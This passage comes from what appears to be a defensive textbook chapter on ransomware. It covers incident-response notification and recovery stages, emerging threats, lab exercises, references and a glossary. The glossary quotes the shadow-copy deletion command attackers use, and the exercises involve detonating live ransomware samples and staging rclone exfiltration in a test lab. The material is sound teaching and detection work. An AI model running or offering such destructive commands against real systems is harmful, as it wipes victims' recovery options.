    return enriched, compromised_hosts
```

#### Stage 4 — Stakeholder Notification Decision Tree

Notification decisions depend on the incident's scope, data exposure, and regulatory context. The SOAR playbook automates the notification workflow based on classification criteria.

The decision tree follows this logic: If data exfiltration is confirmed (evidence of rclone, MEGAcmd, or large outbound transfers in proxy logs), the incident is classified as a data breach, triggering legal counsel notification, regulatory reporting timelines (72 hours under GDPR, 4 business days under SEC rules for material incidents), and customer notification assessment. If no exfiltration evidence exists, the incident is classified as a business disruption, with notification limited to IT leadership and affected business unit owners.

If the organization operates in healthcare (HIPAA), financial services (GLBA/PCI DSS), or handles EU personal data (GDPR), the regulatory notification path is mandatory regardless of whether ransom is paid. The SOAR playbook should pre-populate notification templates with incident details and route them to the legal team for review.

#### Stage 5 — Decryption Feasibility Assessment

Before engaging with the threat actor's negotiation portal, assess whether decryption without payment is possible. This checklist is automated where tooling supports it.

The assessment examines six criteria in priority order. First, check No More Ransom (nomoreransom.org) and ID Ransomware for a public decryptor matching the ransomware family and variant. Second, examine memory dumps from contained hosts for the per-session encryption key (§5.8.2 technique). Third, verify backup integrity — if clean, recent backups exist, decryption is unnecessary. Fourth, assess the ransomware family for known cryptographic weaknesses (§5.7 Rhysida case). Fifth, contact the FBI/IC3, CISA, or relevant national CERT, who may have obtained decryption keys through law enforcement operations (as occurred with multiple Hive victims after the FBI infiltrated Hive infrastructure). Sixth, if the organization has cyber insurance, engage the insurer's incident response panel, which may have access to negotiation services and decryptor intelligence.

#### Stage 6 — Recovery Prioritization Framework

Recovery should follow a prioritized order based on business impact and dependency chains. The framework assigns each system to a recovery tier.

Tier 0 systems (recover first, within 24 hours): Active Directory domain controllers, DNS servers, core network infrastructure (firewalls, switches), and identity providers (Azure AD Connect, ADFS). Without these, no other system can authenticate or communicate. Rebuild domain controllers from clean media; do not attempt to "clean" a compromised DC.

Tier 1 systems (recover within 48 hours): Core business applications (ERP, CRM, email), database servers, and any systems required for revenue generation or regulatory compliance. Restore from verified backups to freshly imaged hosts.

Tier 2 systems (recover within 1 week): File servers, collaboration platforms, development infrastructure, and secondary business applications. Restore from backups; prioritize by number of dependent users.

Tier 3 systems (recover as resources allow): Non-critical workstations, test environments, and archive systems. Reimage from standard builds; data restoration from backups is lower priority.

Throughout recovery, the initial access vector must be patched before restoring internet connectivity. If the initial access was an exploited VPN appliance, that appliance must be patched (or replaced) before the restored environment is connected to the internet. If initial access was stolen credentials, all credentials must be reset and MFA enforced before reconnection. Failure to close the initial access path before recovery invites re-compromise — a scenario observed in multiple incidents where organizations recovered from encryption only to be hit again within days.

---

## 10. Emerging Trends and Future Developments

### 10.1 AI-Augmented Operations

Ransomware affiliates are beginning to use large language models to accelerate operations: generating convincing phishing emails without language errors, writing custom scripts for credential harvesting and lateral movement, and automating reconnaissance. LLM-generated phishing eliminates the spelling and grammatical errors that have traditionally been a phishing indicator. Defenders should assume that phishing emails will be linguistically perfect and adjust detection strategies accordingly (focus on sender reputation, header analysis, and behavioral indicators rather than content-based detection).

### 10.2 ESXi and Hypervisor Targeting

The shift toward encrypting VMware ESXi environments reflects the concentration of critical workloads in virtualized infrastructure. Encrypting a single ESXi host can take down dozens of virtual machines. Defending ESXi requires: SSH key management (rotate keys, disable password-based SSH), vCenter access control (MFA, dedicated admin accounts), ESXi host lockdown mode (restricts DCUI and SSH access), and monitoring `esxcli vm process` commands for unauthorized VM shutdown operations.

### 10.3 Cloud Ransomware

As organizations migrate workloads to cloud services, ransomware targeting cloud environments is emerging. Attacks have included encrypting S3 buckets (by overwriting objects with encrypted versions using the attacker's KMS key and deleting the originals), encrypting Azure Blob Storage, and destroying cloud backups. Defending against cloud ransomware requires: least-privilege IAM policies, S3 Object Lock, Azure resource locks, multi-account cloud architecture (separate the backup account from the production account so that compromising production credentials does not grant access to backups), and CloudTrail/Activity Log monitoring for bulk object operations.

### 10.4 Regulatory and Legal Landscape

Mandatory ransomware payment reporting requirements (enacted by CIRCIA in the U.S., proposed in the EU and UK) will change the data landscape around ransomware economics. Organizations that pay ransoms may be required to report the payment to CISA within 24-72 hours. The SEC's 2023 cybersecurity disclosure rules (effective December 2023) require publicly traded companies to disclose material cybersecurity incidents within four business days of determining materiality, adding regulatory urgency to incident response timelines.

---

## Cross-References

- **Domain 11 Chapter 11A** — Malware injection techniques, rootkits, and C2 architectures (the payload-level mechanics that this chapter treats as operational building blocks)
- **Domain 11 Chapter 11B** — EDR evasion techniques including BYOVD, syscall unhooking, and ETW patching (the evasion layer that enables affiliate tooling to operate undetected)
- **Domain 13 Chapter 13B** — Kerberos protocol attacks (Kerberoasting, AS-REP Roasting, Golden/Silver Tickets) referenced in credential harvesting
- **Domain 14 Chapter 14A** — Active Directory attack paths (ADCS abuse, delegation attacks, GPO manipulation) referenced in privilege escalation
- **Domain 14 Chapter 14B** — Windows internals and Exchange/M365 security
- **Domain 19 Chapter 19A** — Supply chain compromise patterns (SolarWinds, 3CX, xz) that feed into the ransomware initial access ecosystem
- **Domain 23 Chapter 23A** — Social engineering and phishing infrastructure (the human-layer initial access techniques)
- **Domain 24 Chapter 24A** — Digital forensics and incident response workflows (the operational framework this chapter's playbook extends)
- **Domain 25 Chapter 25A** — Threat intelligence and adversary tracking (attribution frameworks for ransomware groups)
- **Domain 27 Chapter 27A** — Secure architecture, detection engineering, and defense-in-depth (the strategic defense framework)
- **Domain 30 Chapter 30A** — C2 framework internals (Cobalt Strike, Mythic, Sliver) used by affiliates
- **Domain 30 Chapter 30B** — Credential theft mechanics at byte level (LSASS parsing, NTDS.DIT extraction)
- **Domain 31 Chapter 31A** — SIEM/SOAR pipeline design for detection at conglomerate scale
- **Domain 31 Chapter 31B** — Zero trust architecture and eBPF-based runtime security

---

*This chapter provides the operational and strategic framework for understanding ransomware as an economic and technical phenomenon. Chapter 29B continues with detailed dissections of specific real-world campaigns (SolarWinds SUNBURST, 3CX, MOVEit/Cl0p, Change Healthcare, Kaseya VSA) that illustrate how these patterns manifest in practice.*

---

## Exercises

1. **Ransomware sample analysis in a sandbox environment.** Obtain a LockBit 3.0 or Rhysida sample from MalwareBazaar (https://bazaar.abuse.ch). Detonate it in a CAPE or Cuckoo sandbox with full API monitoring enabled. Document: (a) the mutex name created, (b) the encryption algorithm identified via crypto API calls, (c) shadow copy deletion commands, (d) service/process termination list, and (e) ransom note file naming convention. Map each observed behavior to a MITRE ATT&CK technique.

2. **YARA rule development for ransomware family identification.** Write three YARA rules that distinguish LockBit 3.0, BlackCat/ALPHV (Rust), and Akira based on binary characteristics: API hashing constants (LockBit), Rust compiler artifacts and embedded JSON configuration markers (BlackCat), and CryptGenRandom + ChaCha20 initialization patterns (Akira). Validate each rule against known samples from VirusTotal or MalwareBazaar. Document false positive rates against a benign binary corpus.

3. **Decryptor feasibility assessment.** Given the Rhysida encryption flaw (C `rand()` seeded with system time): (a) write a Python script that brute-forces the 32-bit seed space for a simulated encrypted file given an approximate encryption timestamp, (b) estimate wall-clock time on commodity hardware, and (c) document why this flaw does not apply to families using `CryptGenRandom` or `/dev/urandom`. Reference the KISA decryptor methodology.

4. **Exfiltration detection engineering.** Configure a test environment with rclone transferring data to a cloud storage endpoint. Write: (a) a Sigma rule detecting rclone process execution with cloud-provider arguments, (b) a Splunk SPL query identifying volumetric anomalies (>5 GB outbound from a single host in 24 hours) from proxy logs, and (c) a Suricata rule detecting HTTPS connections to `g.api.mega.co.nz` from non-browser processes. Test all three against benign and malicious traffic.

5. **Kill chain tabletop and detection gap analysis.** Using the post-compromise operations described in sections 3-4, construct a tabletop scenario: an affiliate enters via Citrix Bleed (CVE-2023-4966), deploys SystemBC, runs SharpHound, Kerberoasts a service account, achieves domain admin via ADCS ESC1, exfiltrates via rclone to Mega, and deploys LockBit 3.0 via PsExec. For each phase, specify: the detection rule that should fire, the required log source, the expected event IDs, and the response action. Identify at least two gaps in your current detection coverage.

---

## Readings and References

- CISA, FBI, MS-ISAC. "#StopRansomware: LockBit 3.0." Advisory AA23-165A (2023). https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a (retrieved: 2026-05-29)
- CISA, FBI, HHS. "#StopRansomware: ALPHV Blackcat." Advisory AA23-353A (2024). https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-353a (retrieved: 2026-05-29)
- CISA. "#StopRansomware: Akira Ransomware." Advisory AA24-109A (2024). https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a (retrieved: 2026-05-29)
- MITRE ATT&CK. "LockBit," Software S1091. https://attack.mitre.org/software/S1091/ (retrieved: 2026-05-29)
- MITRE ATT&CK. "ALPHV BlackCat," Software S1068. https://attack.mitre.org/software/S1068/ (retrieved: 2026-05-29)
- KISA (Korea Internet & Security Agency). "Rhysida Ransomware Decryption Tool and Analysis." (2024). https://seed.kisa.or.kr/kisa/Board/166/detailView.do (retrieved: 2026-05-29)
- Europol / NCA. "Operation Cronos: Disruption of LockBit Ransomware." (February 2024). https://www.europol.europa.eu/media-press/newsroom/news/law-enforcement-disrupt-worlds-biggest-ransomware-operation (retrieved: 2026-05-29)
- CVE-2023-4966 (Citrix Bleed). CVSS 9.4. https://nvd.nist.gov/vuln/detail/CVE-2023-4966 (retrieved: 2026-05-29)
- CVE-2024-1709 (ConnectWise ScreenConnect). CVSS 10.0. https://nvd.nist.gov/vuln/detail/CVE-2024-1709 (retrieved: 2026-05-29)
- CVE-2024-3400 (Palo Alto PAN-OS GlobalProtect). CVSS 10.0. https://nvd.nist.gov/vuln/detail/CVE-2024-3400 (retrieved: 2026-05-29)
- Mandiant. "M-Trends 2025: Special Report." https://www.mandiant.com/m-trends (retrieved: 2026-05-29)

---

## Cross-References

| Domain/Chapter | Topic | Relationship |
|---|---|---|
| Domain 14 Chapter 14A | Active Directory attack paths | Kerberoasting, ADCS abuse, delegation attacks enabling domain dominance (section 3) |
| Domain 30 Chapter 30A | C2 framework internals | Cobalt Strike, Sliver, Brute Ratel used by affiliates for post-compromise C2 (section 3.1) |
| Domain 30 Chapter 30B | Credential theft mechanics | Mimikatz, DCSync, NTDS.DIT extraction driving lateral movement (section 3.2) |
| Domain 29 Chapter 29B | Campaign dissections | Real-world ransomware campaigns illustrating the patterns in this chapter |
| Domain 31 Chapter 31A | SIEM/SOAR detection engineering | Detection-as-code pipeline for operationalizing the Sigma rules in this chapter |
| Domain 31 Chapter 31B | Runtime security and zero trust | Architectural controls (microsegmentation, WDAC, eBPF enforcement) that break the kill chain |

---

## Glossary

| Term | Definition |
|---|---|
| **RaaS (Ransomware-as-a-Service)** | Criminal business model where operators develop ransomware tooling and infrastructure, licensing it to affiliates who conduct intrusions in exchange for a revenue share. |
| **IAB (Initial Access Broker)** | Threat actor who specializes in compromising organizations and selling the resulting access (VPN credentials, RDP sessions, web shells) to ransomware affiliates. |
| **Affiliate** | The operator who purchases access or a RaaS license, conducts the intrusion, achieves domain dominance, exfiltrates data, and deploys the encryptor. |
| **Double extortion** | Ransomware model combining file encryption with data theft and publication threats to pressure victims into payment even if backups are intact. |
| **Intermittent encryption** | Encryption strategy that encrypts only portions of each file (e.g., first 4 KB of every 16 KB block) to maximize speed at the cost of leaving partial plaintext recoverable. |
| **DLS (Data Leak Site)** | Tor hidden service operated by a RaaS group where stolen data from non-paying victims is published, typically in batches with escalating disclosure deadlines. |
| **Infostealer** | Malware (Raccoon, Vidar, RedLine, Lumma, StealC) that harvests browser credentials, cookies, VPN configurations, and cryptocurrency wallets from infected endpoints; logs are sold on marketplaces and feed the IAB supply chain. |
| **Callback phishing (BazarCall)** | Phishing technique where the email contains no malicious payload; instead, the victim is directed to call a phone number where an operator guides them to download malware. |
| **LOLBin (Living-off-the-Land Binary)** | Legitimate signed binaries (PsExec, WMIC, certutil, rundll32) abused by attackers for execution, lateral movement, or defense evasion to avoid deploying custom tools. |
| **Malleable C2 profile** | Configuration file for Cobalt Strike that controls Beacon's network traffic patterns, HTTP headers, URIs, and encryption to mimic legitimate application traffic. |
| **Volume Shadow Copy** | Windows VSS snapshot of a volume; attackers delete shadow copies (`vssadmin delete shadows /all /quiet`) to prevent file recovery, and defenders extract NTDS.DIT from them for credential analysis. |
| **FIDO2/WebAuthn** | Phishing-resistant MFA standard using hardware security keys bound to the legitimate service origin, immune to credential replay and real-time phishing proxy attacks. |
| **Rclone** | Open-source command-line tool for cloud storage synchronization; the most commonly observed data exfiltration tool across ransomware families due to its multi-cloud support and HTTPS transport. |
| **IOCP (I/O Completion Ports)** | Windows asynchronous I/O mechanism used by high-performance ransomware encryptors (LockBit) to maximize disk throughput during encryption. |
| **Checksum8** | Algorithm used by Cobalt Strike where the URI path characters' ASCII values summed modulo 256 produce 92 (x86) or 93 (x64), identifying staging requests. |
